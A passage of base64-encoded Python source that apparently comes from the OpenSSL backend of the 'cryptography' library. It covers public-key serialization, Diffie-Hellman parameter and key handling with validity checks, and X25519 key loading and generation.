clxuICAgICAgICAgICAgICAgICJmb3JtYXQgbXVzdCBiZSBhbiBpdGVtIGZyb20gdGhlIFB1YmxpY0Zvcm1hdCBlbnVtIlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgICMgU3ViamVjdFB1YmxpY0tleUluZm8gKyBQRU0vREVSXHJcbiAgICAgICAgaWYgZm9ybWF0IGlzIHNlcmlhbGl6YXRpb24uUHVibGljRm9ybWF0LlN1YmplY3RQdWJsaWNLZXlJbmZvOlxyXG4gICAgICAgICAgICBpZiBlbmNvZGluZyBpcyBzZXJpYWxpemF0aW9uLkVuY29kaW5nLlBFTTpcclxuICAgICAgICAgICAgICAgIHdyaXRlX2JpbyA9IHNlbGYuX2xpYi5QRU1fd3JpdGVfYmlvX1BVQktFWVxyXG4gICAgICAgICAgICBlbGlmIGVuY29kaW5nIGlzIHNlcmlhbGl6YXRpb24uRW5jb2RpbmcuREVSOlxyXG4gICAgICAgICAgICAgICAgd3JpdGVfYmlvID0gc2VsZi5fbGliLmkyZF9QVUJLRVlfYmlvXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICJTdWJqZWN0UHVibGljS2V5SW5mbyB3b3JrcyBvbmx5IHdpdGggUEVNIG9yIERFUiBlbmNvZGluZyJcclxuICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX2Jpb19mdW5jX291dHB1dCh3cml0ZV9iaW8sIGV2cF9wa2V5KVxyXG5cclxuICAgICAgICAjIFBLQ1MxICsgUEVNL0RFUlxyXG4gICAgICAgIGlmIGZvcm1hdCBpcyBzZXJpYWxpemF0aW9uLlB1YmxpY0Zvcm1hdC5QS0NTMTpcclxuICAgICAgICAgICAgIyBPbmx5IFJTQSBpcyBzdXBwb3J0ZWQgaGVyZS5cclxuICAgICAgICAgICAga2V5X3R5cGUgPSBzZWxmLl9saWIuRVZQX1BLRVlfaWQoZXZwX3BrZXkpXHJcbiAgICAgICAgICAgIGlmIGtleV90eXBlICE9IHNlbGYuX2xpYi5FVlBfUEtFWV9SU0E6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJQS0NTMSBmb3JtYXQgaXMgc3VwcG9ydGVkIG9ubHkgZm9yIFJTQSBrZXlzIilcclxuXHJcbiAgICAgICAgICAgIGlmIGVuY29kaW5nIGlzIHNlcmlhbGl6YXRpb24uRW5jb2RpbmcuUEVNOlxyXG4gICAgICAgICAgICAgICAgd3JpdGVfYmlvID0gc2VsZi5fbGliLlBFTV93cml0ZV9iaW9fUlNBUHVibGljS2V5XHJcbiAgICAgICAgICAgIGVsaWYgZW5jb2RpbmcgaXMgc2VyaWFsaXphdGlvbi5FbmNvZGluZy5ERVI6XHJcbiAgICAgICAgICAgICAgICB3cml0ZV9iaW8gPSBzZWxmLl9saWIuaTJkX1JTQVB1YmxpY0tleV9iaW9cclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIlBLQ1MxIHdvcmtzIG9ubHkgd2l0aCBQRU0gb3IgREVSIGVuY29kaW5nIilcclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX2Jpb19mdW5jX291dHB1dCh3cml0ZV9iaW8sIGNkYXRhKVxyXG5cclxuICAgICAgICAjIE9wZW5TU0ggKyBPcGVuU1NIXHJcbiAgICAgICAgaWYgZm9ybWF0IGlzIHNlcmlhbGl6YXRpb24uUHVibGljRm9ybWF0Lk9wZW5TU0g6XHJcbiAgICAgICAgICAgIGlmIGVuY29kaW5nIGlzIHNlcmlhbGl6YXRpb24uRW5jb2RpbmcuT3BlblNTSDpcclxuICAgICAgICAgICAgICAgIHJldHVybiBzc2guc2VyaWFsaXplX3NzaF9wdWJsaWNfa2V5KGtleSlcclxuXHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiT3BlblNTSCBmb3JtYXQgbXVzdCBiZSB1c2VkIHdpdGggT3BlblNTSCBlbmNvZGluZyJcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICAjIEFueXRoaW5nIHRoYXQga2V5LXNwZWNpZmljIGNvZGUgd2FzIHN1cHBvc2VkIHRvIGhhbmRsZSBlYXJsaWVyLFxyXG4gICAgICAgICMgbGlrZSBSYXcsIENvbXByZXNzZWRQb2ludCwgVW5jb21wcmVzc2VkUG9pbnRcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJmb3JtYXQgaXMgaW52YWxpZCB3aXRoIHRoaXMga2V5IilcclxuXHJcbiAgICBkZWYgZGhfc3VwcG9ydGVkKHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgcmV0dXJuIG5vdCBzZWxmLl9saWIuQ1JZUFRPR1JBUEhZX0lTX0JPUklOR1NTTFxyXG5cclxuICAgIGRlZiBnZW5lcmF0ZV9kaF9wYXJhbWV0ZXJzKFxyXG4gICAgICAgIHNlbGYsIGdlbmVyYXRvcjogaW50LCBrZXlfc2l6ZTogaW50XHJcbiAgICApIC0+IGRoLkRIUGFyYW1ldGVyczpcclxuICAgICAgICBpZiBrZXlfc2l6ZSA8IGRoLl9NSU5fTU9EVUxVU19TSVpFOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIkRIIGtleV9zaXplIG11c3QgYmUgYXQgbGVhc3Qge30gYml0cyIuZm9ybWF0KFxyXG4gICAgICAgICAgICAgICAgICAgIGRoLl9NSU5fTU9EVUxVU19TSVpFXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgaWYgZ2VuZXJhdG9yIG5vdCBpbiAoMiwgNSk6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkRIIGdlbmVyYXRvciBtdXN0IGJlIDIgb3IgNSIpXHJcblxyXG4gICAgICAgIGRoX3BhcmFtX2NkYXRhID0gc2VsZi5fbGliLkRIX25ldygpXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChkaF9wYXJhbV9jZGF0YSAhPSBzZWxmLl9mZmkuTlVMTClcclxuICAgICAgICBkaF9wYXJhbV9jZGF0YSA9IHNlbGYuX2ZmaS5nYyhkaF9wYXJhbV9jZGF0YSwgc2VsZi5fbGliLkRIX2ZyZWUpXHJcblxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2xpYi5ESF9nZW5lcmF0ZV9wYXJhbWV0ZXJzX2V4KFxyXG4gICAgICAgICAgICBkaF9wYXJhbV9jZGF0YSwga2V5X3NpemUsIGdlbmVyYXRvciwgc2VsZi5fZmZpLk5VTExcclxuICAgICAgICApXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuXHJcbiAgICAgICAgcmV0dXJuIF9ESFBhcmFtZXRlcnMoc2VsZiwgZGhfcGFyYW1fY2RhdGEpXHJcblxyXG4gICAgZGVmIF9kaF9jZGF0YV90b19ldnBfcGtleShzZWxmLCBkaF9jZGF0YSk6XHJcbiAgICAgICAgZXZwX3BrZXkgPSBzZWxmLl9jcmVhdGVfZXZwX3BrZXlfZ2MoKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2xpYi5FVlBfUEtFWV9zZXQxX0RIKGV2cF9wa2V5LCBkaF9jZGF0YSlcclxuICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KHJlcyA9PSAxKVxyXG4gICAgICAgIHJldHVybiBldnBfcGtleVxyXG5cclxuICAgIGRlZiBnZW5lcmF0ZV9kaF9wcml2YXRlX2tleShcclxuICAgICAgICBzZWxmLCBwYXJhbWV0ZXJzOiBkaC5ESFBhcmFtZXRlcnNcclxuICAgICkgLT4gZGguREhQcml2YXRlS2V5OlxyXG4gICAgICAgIGRoX2tleV9jZGF0YSA9IF9kaF9wYXJhbXNfZHVwKFxyXG4gICAgICAgICAgICBwYXJhbWV0ZXJzLl9kaF9jZGF0YSwgc2VsZiAgIyB0eXBlOiBpZ25vcmVbYXR0ci1kZWZpbmVkXVxyXG4gICAgICAgIClcclxuXHJcbiAgICAgICAgcmVzID0gc2VsZi5fbGliLkRIX2dlbmVyYXRlX2tleShkaF9rZXlfY2RhdGEpXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuXHJcbiAgICAgICAgZXZwX3BrZXkgPSBzZWxmLl9kaF9jZGF0YV90b19ldnBfcGtleShkaF9rZXlfY2RhdGEpXHJcblxyXG4gICAgICAgIHJldHVybiBfREhQcml2YXRlS2V5KHNlbGYsIGRoX2tleV9jZGF0YSwgZXZwX3BrZXkpXHJcblxyXG4gICAgZGVmIGdlbmVyYXRlX2RoX3ByaXZhdGVfa2V5X2FuZF9wYXJhbWV0ZXJzKFxyXG4gICAgICAgIHNlbGYsIGdlbmVyYXRvcjogaW50LCBrZXlfc2l6ZTogaW50XHJcbiAgICApIC0+IGRoLkRIUHJpdmF0ZUtleTpcclxuICAgICAgICByZXR1cm4gc2VsZi5nZW5lcmF0ZV9kaF9wcml2YXRlX2tleShcclxuICAgICAgICAgICAgc2VsZi5nZW5lcmF0ZV9kaF9wYXJhbWV0ZXJzKGdlbmVyYXRvciwga2V5X3NpemUpXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBsb2FkX2RoX3ByaXZhdGVfbnVtYmVycyhcclxuICAgICAgICBzZWxmLCBudW1iZXJzOiBkaC5ESFByaXZhdGVOdW1iZXJzXHJcbiAgICApIC0+IGRoLkRIUHJpdmF0ZUtleTpcclxuICAgICAgICBwYXJhbWV0ZXJfbnVtYmVycyA9IG51bWJlcnMucHVibGljX251bWJlcnMucGFyYW1ldGVyX251bWJlcnNcclxuXHJcbiAgICAgICAgZGhfY2RhdGEgPSBzZWxmLl9saWIuREhfbmV3KClcclxuICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KGRoX2NkYXRhICE9IHNlbGYuX2ZmaS5OVUxMKVxyXG4gICAgICAgIGRoX2NkYXRhID0gc2VsZi5fZmZpLmdjKGRoX2NkYXRhLCBzZWxmLl9saWIuREhfZnJlZSlcclxuXHJcbiAgICAgICAgcCA9IHNlbGYuX2ludF90b19ibihwYXJhbWV0ZXJfbnVtYmVycy5wKVxyXG4gICAgICAgIGcgPSBzZWxmLl9pbnRfdG9fYm4ocGFyYW1ldGVyX251bWJlcnMuZylcclxuXHJcbiAgICAgICAgaWYgcGFyYW1ldGVyX251bWJlcnMucSBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgcSA9IHNlbGYuX2ludF90b19ibihwYXJhbWV0ZXJfbnVtYmVycy5xKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHEgPSBzZWxmLl9mZmkuTlVMTFxyXG5cclxuICAgICAgICBwdWJfa2V5ID0gc2VsZi5faW50X3RvX2JuKG51bWJlcnMucHVibGljX251bWJlcnMueSlcclxuICAgICAgICBwcml2X2tleSA9IHNlbGYuX2ludF90b19ibihudW1iZXJzLngpXHJcblxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2xpYi5ESF9zZXQwX3BxZyhkaF9jZGF0YSwgcCwgcSwgZylcclxuICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KHJlcyA9PSAxKVxyXG5cclxuICAgICAgICByZXMgPSBzZWxmLl9saWIuREhfc2V0MF9rZXkoZGhfY2RhdGEsIHB1Yl9rZXksIHByaXZfa2V5KVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcblxyXG4gICAgICAgIGNvZGVzID0gc2VsZi5fZmZpLm5ldygiaW50W10iLCAxKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2xpYi5DcnlwdG9ncmFwaHlfREhfY2hlY2soZGhfY2RhdGEsIGNvZGVzKVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcblxyXG4gICAgICAgICMgREhfY2hlY2sgd2lsbCByZXR1cm4gREhfTk9UX1NVSVRBQkxFX0dFTkVSQVRPUiBpZiBwICUgMjQgZG9lcyBub3RcclxuICAgICAgICAjIGVxdWFsIDExIHdoZW4gdGhlIGdlbmVyYXRvciBpcyAyIChhIHF1YWRyYXRpYyBub25yZXNpZHVlKS5cclxuICAgICAgICAjIFdlIHdhbnQgdG8gaWdub3JlIHRoYXQgZXJyb3IgYmVjYXVzZSBwICUgMjQgPT0gMjMgaXMgYWxzbyBmaW5lLlxyXG4gICAgICAgICMgU3BlY2lmaWNhbGx5LCBnIGlzIHRoZW4gYSBxdWFkcmF0aWMgcmVzaWR1ZS4gV2l0aGluIHRoZSBjb250ZXh0IG9mXHJcbiAgICAgICAgIyBEaWZmaWUtSGVsbG1hbiB0aGlzIG1lYW5zIGl0IGNhbiBvbmx5IGdlbmVyYXRlIGhhbGYgdGhlIHBvc3NpYmxlXHJcbiAgICAgICAgIyB2YWx1ZXMuIFRoYXQgc291bmRzIGJhZCwgYnV0IHF1YWRyYXRpYyBub25yZXNpZHVlcyBsZWFrIGEgYml0IG9mXHJcbiAgICAgICAgIyB0aGUga2V5IHRvIHRoZSBhdHRhY2tlciBpbiBleGNoYW5nZSBmb3IgaGF2aW5nIHRoZSBmdWxsIGtleSBzcGFjZVxyXG4gICAgICAgICMgYXZhaWxhYmxlLiBTZWU6IGh0dHBzOi8vY3J5cHRvLnN0YWNrZXhjaGFuZ2UuY29tL3F1ZXN0aW9ucy8xMjk2MVxyXG4gICAgICAgIGlmIGNvZGVzWzBdICE9IDAgYW5kIG5vdCAoXHJcbiAgICAgICAgICAgIHBhcmFtZXRlcl9udW1iZXJzLmcgPT0gMlxyXG4gICAgICAgICAgICBhbmQgY29kZXNbMF0gXiBzZWxmLl9saWIuREhfTk9UX1NVSVRBQkxFX0dFTkVSQVRPUiA9PSAwXHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiREggcHJpdmF0ZSBudW1iZXJzIGRpZCBub3QgcGFzcyBzYWZldHkgY2hlY2tzLiIpXHJcblxyXG4gICAgICAgIGV2cF9wa2V5ID0gc2VsZi5fZGhfY2RhdGFfdG9fZXZwX3BrZXkoZGhfY2RhdGEpXHJcblxyXG4gICAgICAgIHJldHVybiBfREhQcml2YXRlS2V5KHNlbGYsIGRoX2NkYXRhLCBldnBfcGtleSlcclxuXHJcbiAgICBkZWYgbG9hZF9kaF9wdWJsaWNfbnVtYmVycyhcclxuICAgICAgICBzZWxmLCBudW1iZXJzOiBkaC5ESFB1YmxpY051bWJlcnNcclxuICAgICkgLT4gZGguREhQdWJsaWNLZXk6XHJcbiAgICAgICAgZGhfY2RhdGEgPSBzZWxmLl9saWIuREhfbmV3KClcclxuICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KGRoX2NkYXRhICE9IHNlbGYuX2ZmaS5OVUxMKVxyXG4gICAgICAgIGRoX2NkYXRhID0gc2VsZi5fZmZpLmdjKGRoX2NkYXRhLCBzZWxmLl9saWIuREhfZnJlZSlcclxuXHJcbiAgICAgICAgcGFyYW1ldGVyX251bWJlcnMgPSBudW1iZXJzLnBhcmFtZXRlcl9udW1iZXJzXHJcblxyXG4gICAgICAgIHAgPSBzZWxmLl9pbnRfdG9fYm4ocGFyYW1ldGVyX251bWJlcnMucClcclxuICAgICAgICBnID0gc2VsZi5faW50X3RvX2JuKHBhcmFtZXRlcl9udW1iZXJzLmcpXHJcblxyXG4gICAgICAgIGlmIHBhcmFtZXRlcl9udW1iZXJzLnEgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHEgPSBzZWxmLl9pbnRfdG9fYm4ocGFyYW1ldGVyX251bWJlcnMucSlcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBxID0gc2VsZi5fZmZpLk5VTExcclxuXHJcbiAgICAgICAgcHViX2tleSA9IHNlbGYuX2ludF90b19ibihudW1iZXJzLnkpXHJcblxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2xpYi5ESF9zZXQwX3BxZyhkaF9jZGF0YSwgcCwgcSwgZylcclxuICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KHJlcyA9PSAxKVxyXG5cclxuICAgICAgICByZXMgPSBzZWxmLl9saWIuREhfc2V0MF9rZXkoZGhfY2RhdGEsIHB1Yl9rZXksIHNlbGYuX2ZmaS5OVUxMKVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcblxyXG4gICAgICAgIGV2cF9wa2V5ID0gc2VsZi5fZGhfY2RhdGFfdG9fZXZwX3BrZXkoZGhfY2RhdGEpXHJcblxyXG4gICAgICAgIHJldHVybiBfREhQdWJsaWNLZXkoc2VsZiwgZGhfY2RhdGEsIGV2cF9wa2V5KVxyXG5cclxuICAgIGRlZiBsb2FkX2RoX3BhcmFtZXRlcl9udW1iZXJzKFxyXG4gICAgICAgIHNlbGYsIG51bWJlcnM6IGRoLkRIUGFyYW1ldGVyTnVtYmVyc1xyXG4gICAgKSAtPiBkaC5ESFBhcmFtZXRlcnM6XHJcbiAgICAgICAgZGhfY2RhdGEgPSBzZWxmLl9saWIuREhfbmV3KClcclxuICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KGRoX2NkYXRhICE9IHNlbGYuX2ZmaS5OVUxMKVxyXG4gICAgICAgIGRoX2NkYXRhID0gc2VsZi5fZmZpLmdjKGRoX2NkYXRhLCBzZWxmLl9saWIuREhfZnJlZSlcclxuXHJcbiAgICAgICAgcCA9IHNlbGYuX2ludF90b19ibihudW1iZXJzLnApXHJcbiAgICAgICAgZyA9IHNlbGYuX2ludF90b19ibihudW1iZXJzLmcpXHJcblxyXG4gICAgICAgIGlmIG51bWJlcnMucSBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgcSA9IHNlbGYuX2ludF90b19ibihudW1iZXJzLnEpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcSA9IHNlbGYuX2ZmaS5OVUxMXHJcblxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2xpYi5ESF9zZXQwX3BxZyhkaF9jZGF0YSwgcCwgcSwgZylcclxuICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KHJlcyA9PSAxKVxyXG5cclxuICAgICAgICByZXR1cm4gX0RIUGFyYW1ldGVycyhzZWxmLCBkaF9jZGF0YSlcclxuXHJcbiAgICBkZWYgZGhfcGFyYW1ldGVyc19zdXBwb3J0ZWQoXHJcbiAgICAgICAgc2VsZiwgcDogaW50LCBnOiBpbnQsIHE6IHR5cGluZy5PcHRpb25hbFtpbnRdID0gTm9uZVxyXG4gICAgKSAtPiBib29sOlxyXG4gICAgICAgIGRoX2NkYXRhID0gc2VsZi5fbGliLkRIX25ldygpXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChkaF9jZGF0YSAhPSBzZWxmLl9mZmkuTlVMTClcclxuICAgICAgICBkaF9jZGF0YSA9IHNlbGYuX2ZmaS5nYyhkaF9jZGF0YSwgc2VsZi5fbGliLkRIX2ZyZWUpXHJcblxyXG4gICAgICAgIHAgPSBzZWxmLl9pbnRfdG9fYm4ocClcclxuICAgICAgICBnID0gc2VsZi5faW50X3RvX2JuKGcpXHJcblxyXG4gICAgICAgIGlmIHEgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHEgPSBzZWxmLl9pbnRfdG9fYm4ocSlcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBxID0gc2VsZi5fZmZpLk5VTExcclxuXHJcbiAgICAgICAgcmVzID0gc2VsZi5fbGliLkRIX3NldDBfcHFnKGRoX2NkYXRhLCBwLCBxLCBnKVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcblxyXG4gICAgICAgIGNvZGVzID0gc2VsZi5fZmZpLm5ldygiaW50W10iLCAxKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2xpYi5DcnlwdG9ncmFwaHlfREhfY2hlY2soZGhfY2RhdGEsIGNvZGVzKVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcblxyXG4gICAgICAgIHJldHVybiBjb2Rlc1swXSA9PSAwXHJcblxyXG4gICAgZGVmIGRoX3g5NDJfc2VyaWFsaXphdGlvbl9zdXBwb3J0ZWQoc2VsZikgLT4gYm9vbDpcclxuICAgICAgICByZXR1cm4gc2VsZi5fbGliLkNyeXB0b2dyYXBoeV9IQVNfRVZQX1BLRVlfREhYID09IDFcclxuXHJcbiAgICBkZWYgeDI1NTE5X2xvYWRfcHVibGljX2J5dGVzKHNlbGYsIGRhdGE6IGJ5dGVzKSAtPiB4MjU1MTkuWDI1NTE5UHVibGljS2V5OlxyXG4gICAgICAgICMgV2hlbiB3ZSBkcm9wIHN1cHBvcnQgZm9yIENSWVBUT0dSQVBIWV9PUEVOU1NMX0xFU1NfVEhBTl8xMTEgd2UgY2FuXHJcbiAgICAgICAgIyBzd2l0Y2ggdGhpcyB0byBFVlBfUEtFWV9uZXdfcmF3X3B1YmxpY19rZXlcclxuICAgICAgICBpZiBsZW4oZGF0YSkgIT0gMzI6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkFuIFgyNTUxOSBwdWJsaWMga2V5IGlzIDMyIGJ5dGVzIGxvbmciKVxyXG5cclxuICAgICAgICBldnBfcGtleSA9IHNlbGYuX2NyZWF0ZV9ldnBfcGtleV9nYygpXHJcbiAgICAgICAgcmVzID0gc2VsZi5fbGliLkVWUF9QS0VZX3NldF90eXBlKGV2cF9wa2V5LCBzZWxmLl9saWIuTklEX1gyNTUxOSlcclxuICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KHJlcyA9PSAxKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2xpYi5FVlBfUEtFWV9zZXQxX3Rsc19lbmNvZGVkcG9pbnQoXHJcbiAgICAgICAgICAgIGV2cF9wa2V5LCBkYXRhLCBsZW4oZGF0YSlcclxuICAgICAgICApXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuICAgICAgICByZXR1cm4gX1gyNTUxOVB1YmxpY0tleShzZWxmLCBldnBfcGtleSlcclxuXHJcbiAgICBkZWYgeDI1NTE5X2xvYWRfcHJpdmF0ZV9ieXRlcyhcclxuICAgICAgICBzZWxmLCBkYXRhOiBieXRlc1xyXG4gICAgKSAtPiB4MjU1MTkuWDI1NTE5UHJpdmF0ZUtleTpcclxuICAgICAgICAjIFdoZW4gd2UgZHJvcCBzdXBwb3J0IGZvciBDUllQVE9HUkFQSFlfT1BFTlNTTF9MRVNTX1RIQU5fMTExIHdlIGNhblxyXG4gICAgICAgICMgc3dpdGNoIHRoaXMgdG8gRVZQX1BLRVlfbmV3X3Jhd19wcml2YXRlX2tleSBhbmQgZHJvcCB0aGVcclxuICAgICAgICAjIHplcm9lZF9ieXRlYXJyYXkgZ2FyYmFnZS5cclxuICAgICAgICAjIE9wZW5TU0wgb25seSBoYXMgZmFjaWxpdGllcyBmb3IgbG9hZGluZyBQS0NTOCBmb3JtYXR0ZWQgcHJpdmF0ZVxyXG4gICAgICAgICMga2V5cyB1c2luZyB0aGUgYWxnb3JpdGhtIGlkZW50aWZpZXJzIHNwZWNpZmllZCBpblxyXG4gICAgICAgICMgaHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL2RyYWZ0LWlldGYtY3VyZGxlLXBraXgtMDkuXHJcbiAgICAgICAgIyBUaGlzIGlzIHRoZSBzdGFuZGFyZCBQS0NTOCBwcmVmaXggZm9yIGEgMzIgYnl0ZSBYMjU1MTkga2V5LlxyXG4gICAgICAgICMgVGhlIGZvcm0gaXM6XHJcbiAgICAgICAgIyAgICAwOmQ9MCAgaGw9MiBsPSAgNDYgY29uczogU0VRVUVOQ0VcclxuICAgICAgICAjICAgIDI6ZD0xICBobD0yIGw9ICAgMSBwcmltOiBJTlRFR0VSICAgICAgICAgICA6MDBcclxuICAgICAgICAjICAgIDU6ZD0xICBobD0yIGw9ICAgNSBjb25zOiBTRVFVRU5DRVxyXG4gICAgICAgICMgICAgNzpkPTIgIGhsPTIgbD0gICAzIHByaW06IE9CSkVDVCAgICAgICAgICAgIDoxLjMuMTAxLjExMFxyXG4gICAgICAgICMgICAgMTI6ZD0xICBobD0yIGw9ICAzNCBwcmltOiBPQ1RFVCBTVFJJTkcgICAgICAodGhlIGtleSlcclxuICAgICAgICAjIE9mIGNvdXJzZSB0aGVyZVwncyBhIGJpdCBtb3JlIGNvbXBsZXhpdHkuIEluIHJlYWxpdHkgT0NURVQgU1RSSU5HXHJcbiAgICAgICAgIyBjb250YWlucyBhbiBPQ1RFVCBTVFJJTkcgb2YgbGVuZ3RoIDMyISBTbyB0aGUgbGFzdCB0d28gYnl0ZXMgaGVyZVxyXG4gICAgICAgICMgYXJlIFxceDA0XFx4MjAsIHdoaWNoIGlzIGFuIE9DVEVUIFNUUklORyBvZiBsZW5ndGggMzIuXHJcbiAgICAgICAgaWYgbGVuKGRhdGEpICE9IDMyOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJBbiBYMjU1MTkgcHJpdmF0ZSBrZXkgaXMgMzIgYnl0ZXMgbG9uZyIpXHJcblxyXG4gICAgICAgIHBrY3M4X3ByZWZpeCA9IGJcJzAuXFx4MDJcXHgwMVxceDAwMFxceDA1XFx4MDZcXHgwMytlblxceDA0IlxceDA0IFwnXHJcbiAgICAgICAgd2l0aCBzZWxmLl96ZXJvZWRfYnl0ZWFycmF5KDQ4KSBhcyBiYTpcclxuICAgICAgICAgICAgYmFbMDoxNl0gPSBwa2NzOF9wcmVmaXhcclxuICAgICAgICAgICAgYmFbMTY6XSA9IGRhdGFcclxuICAgICAgICAgICAgYmlvID0gc2VsZi5fYnl0ZXNfdG9fYmlvKGJhKVxyXG4gICAgICAgICAgICBldnBfcGtleSA9IHNlbGYuX2xpYi5kMmlfUHJpdmF0ZUtleV9iaW8oYmlvLmJpbywgc2VsZi5fZmZpLk5VTEwpXHJcblxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQoZXZwX3BrZXkgIT0gc2VsZi5fZmZpLk5VTEwpXHJcbiAgICAgICAgZXZwX3BrZXkgPSBzZWxmLl9mZmkuZ2MoZXZwX3BrZXksIHNlbGYuX2xpYi5FVlBfUEtFWV9mcmVlKVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQoXHJcbiAgICAgICAgICAgIHNlbGYuX2xpYi5FVlBfUEtFWV9pZChldnBfcGtleSkgPT0gc2VsZi5fbGliLkVWUF9QS0VZX1gyNTUxOVxyXG4gICAgICAgIClcclxuICAgICAgICByZXR1cm4gX1gyNTUxOVByaXZhdGVLZXkoc2VsZiwgZXZwX3BrZXkpXHJcblxyXG4gICAgZGVmIF9ldnBfcGtleV9rZXlnZW5fZ2Moc2VsZiwgbmlkKTpcclxuICAgICAgICBldnBfcGtleV9jdHggPSBzZWxmLl9saWIuRVZQX1BLRVlfQ1RYX25ld19pZChuaWQsIHNlbGYuX2ZmaS5OVUxMKVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQoZXZwX3BrZXlfY3R4ICE9IHNlbGYuX2ZmaS5OVUxMKVxyXG4gICAgICAgIGV2cF9wa2V5X2N0eCA9IHNlbGYuX2ZmaS5nYyhldnBfcGtleV9jdHgsIHNlbGYuX2xpYi5FVlBfUEtFWV9DVFhfZnJlZSlcclxuICAgICAgICByZXMgPSBzZWxmLl9saWIuRVZQX1BLRVlfa2V5Z2VuX2luaXQoZXZwX3BrZXlfY3R4KVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAgZXZwX3Bwa2V5ID0gc2VsZi5fZmZpLm5ldygiRVZQX1BLRVkgKioiKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2xpYi5FVlBfUEtFWV9rZXlnZW4oZXZwX3BrZXlfY3R4LCBldnBfcHBrZXkpXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KGV2cF9wcGtleVswXSAhPSBzZWxmLl9mZmkuTlVMTClcclxuICAgICAgICBldnBfcGtleSA9IHNlbGYuX2ZmaS5nYyhldnBfcHBrZXlbMF0sIHNlbGYuX2xpYi5FVlBfUEtFWV9mcmVlKVxyXG4gICAgICAgIHJldHVybiBldnBfcGtleVxyXG5cclxuICAgIGRlZiB4MjU1MTlfZ2VuZXJhdGVfa2V5KHNlbGYpIC0+IHgyNTUxOS5YMjU1MTlQcml2YXRlS2V5OlxyXG4gICAgICAgIGV2cF9wa2V5ID0gc2VsZi5fZXZwX3BrZXlfa2V5Z2VuX2djKHNlbGYuX2xpYi5OSURfWDI1NTE5KVxyXG4gICAgICAgIHJldHVybiBfWDI1NTE5UHJpdmF0ZUtleShzZWxmLCBldnBfcGtleSlcclxuXHJcbiAgICBkZWYgeDI1NTE5X3N1cHBvcnRlZChzZWxmKSAtPiBib29sOlxyXG4gICAgICAgIGlmIHNlbGYuX2ZpcHNfZW5hYmxlZDpcclxuICAgICAgICAgICAgcmV0dXJuIEZhbHNlXHJcbiAgICAgICAgcmV0d